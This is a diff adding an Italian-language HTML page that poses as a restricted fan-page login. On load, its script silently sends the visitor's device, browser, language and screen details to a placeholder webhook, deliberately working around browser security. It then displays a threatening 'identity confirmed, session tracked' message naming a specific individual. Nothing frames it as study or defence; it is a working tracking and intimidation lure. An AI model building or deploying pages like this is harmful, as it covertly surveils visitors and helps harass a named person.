@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Accesso Riservato - Area Fanpage</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        #console { border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 20px #0f0; max-width: 80%; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+
+<div id="console">
+    <p>> INIZIALIZZAZIONE PROTOCOLLO DI SICUREZZA...</p>
+    <p>> VERIFICA IDENTITÀ UTENTE IN CORSO...</p>
+    <p id="status">Attendere... <span class="blink">_</span></p>
+</div>
+
+<script>
+    // --- CONFIGURAZIONE ---
+    const tuowebhook = "INSERISCI_QUI_IL_TUO_URL_WEBHOOK_SITE"; // Incolla qui l'URL di Webhook.site
+
+    async function catturaDati() {
+        // Raccogliamo i dati base dal browser
+        const dati = {
+            ora: new Date().toLocaleString(),
+            dispositivo: navigator.userAgent,
+            lingua: navigator.language,
+            risoluzione: `${window.screen.width}x${window.screen.height}`,
+            piattaforma: navigator.platform
+        };
+
+        // Inviamo i dati al tuo Webhook in modo silenzioso
+        try {
+            await fetch(tuowebhook, {
+                method: 'POST',
+                mode: 'no-cors', // Per evitare blocchi di sicurezza
+                body: JSON.stringify(dati)
+            });
+            
+            // Dopo 3 secondi, mostriamo un messaggio inquietante
+            setTimeout(() => {
+                document.getElementById('status').innerHTML = "IDENTITÀ CONFERMATA: <br><strong>UTENTE: FRANCESCO STABILE</strong><br>SESSIONE TRACCIATA.";
+            }, 3000);
+        } catch (e) {
+            console.log("Errore invio");
+        }
+    }
+
+    window.onload = catturaDati;
+</script>
+
+</body>
+</html>
